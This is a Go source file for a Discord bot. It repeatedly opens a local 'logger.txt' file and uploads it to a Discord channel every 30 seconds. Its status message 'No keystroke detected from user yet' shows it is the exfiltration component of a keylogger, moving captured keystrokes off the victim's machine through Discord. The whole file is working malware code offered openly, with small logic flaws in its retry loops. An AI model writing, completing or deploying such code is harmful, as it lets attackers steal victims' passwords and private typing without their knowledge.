package bot

import (
	"log"
	"os"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var BotId string

func Start() {
	godotenv.Load()
	var token = os.Getenv("bot_token")
	dbot, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Println(err)
	}

	user, err := dbot.User("@me")
	if err != nil {
		log.Printf("Error getting user: %v", err)
	}

	BotId = user.ID
	dbot.AddHandler(fileHandler)

	err = dbot.Open()
	if err != nil {
		log.Printf("An error occured creating a connection to discord: %v", err)
	}

}

func fileHandler(s *discordgo.Session, m *discordgo.MessageCreate) {

	if m.Author.ID == BotId {
		return
	}

	var wg sync.WaitGroup

	wg.Add(2)
	var logger_file = make(chan *os.File)

	go func() {
		for {
			file, err := os.OpenFile("logger.txt", os.O_RDONLY, 0644)
			if err != nil {
				_, _ = s.ChannelMessageSend(m.ChannelID, "No keystroke detected from user yet")
				for {
					file, err := os.OpenFile("logger.txt", os.O_RDONLY, 0644)
					log.Println("Retrying in 5seconds")
					if err == nil {
						logger_file <- file
						break
					}
					time.Sleep(time.Second * 5)
				}
			}
			logger_file <- file
		}
	}()

	go func() {
		for {
			file := <-logger_file
			log.Println("Sending file...")
			_, err := s.ChannelFileSend(m.ChannelID, "logger.txt", file)
			if err != nil {
				log.Printf("error sending file: %v", err)
				for {
					log.Println("Would retry in 7seconds")
					time.Sleep(time.Second * 7)
					if err == nil {
						break
					}
				}
			}
			time.Sleep(time.Second * 30)
		}
	}()
	wg.Wait()

}
